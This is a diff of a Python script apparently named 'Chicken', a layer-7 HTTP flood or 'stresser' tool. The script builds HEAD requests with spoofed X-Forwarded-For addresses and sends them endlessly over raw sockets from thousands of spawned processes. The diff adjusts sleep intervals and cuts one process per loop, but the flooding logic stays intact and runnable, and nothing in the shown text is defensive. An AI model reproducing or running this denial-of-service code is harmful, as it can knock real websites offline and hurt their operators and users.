@@ -26,14 +26,14 @@ def randomip():
 
 print("[>>>] Launching Chicken [<<<]")
 
-time.sleep(1)
+time.sleep(3)
 
 def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
   get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
+  request = get_host + referer + connection + forward + "\r\n\r\n"
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,7 +41,7 @@ def attack():
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
-      time.sleep(.1)
+      time.sleep(1)
     except:
       pass
 
@@ -49,13 +49,10 @@ def sendattack():
   for i in range(5000):
     mp = multiprocessing.Process(target=attack)
     mp2 = multiprocessing.Process(target=attack)
-    mp3 = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp2.setDaemon = False
-    mp3.setDaemon = False
     mp.start()
     mp2.start()
-    mp3.start()
 
 sendattack()
 # 60 Line for Powerful Layer 7 Stresser Cool!
